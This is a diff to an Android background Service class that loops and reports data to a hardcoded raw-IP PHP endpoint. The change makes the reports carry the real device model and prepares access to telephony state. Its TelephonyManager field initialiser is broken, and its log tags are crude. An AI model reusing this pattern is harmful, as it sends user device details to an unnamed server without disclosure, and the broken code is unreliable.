@@ -5,6 +5,9 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
+import android.telephony.PhoneStateListener;
+import android.telephony.SignalStrength;
+import android.telephony.TelephonyManager;
 import android.util.Log;
 
 import java.io.IOException;
@@ -23,6 +26,10 @@ import okio.Okio;
 
 public class FMC extends Service {
     public static HashMap<String, String> queue = new HashMap<String, String>();
+    private TelephonyManager tm= (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
+
+
+
     //获得闹钟管理器
     /**
      * 客户端执行轮询的时间间隔，该值由StartQueryInterface接口返回，默认设置为30s
@@ -63,6 +70,7 @@ startLoop();
     }
     public void doReport()
     {
+        
         Log.i("Fuck","Reported");
          String url="http://118.190.203.180:19132/senduseage.php?";
         OkHttpClient client = new OkHttpClient();
@@ -95,7 +103,7 @@ Log.i("fuck",response.toString());
     }
 public void onCreate(){
     queue.put("ID","Stratus");
-    queue.put("DEVICE","Nexus AVD");
+    queue.put("DEVICE",android.os.Build.MODEL);
     queue.put("ACTION","Loop");
     startLoop();
     Log.i("FMC","lps");
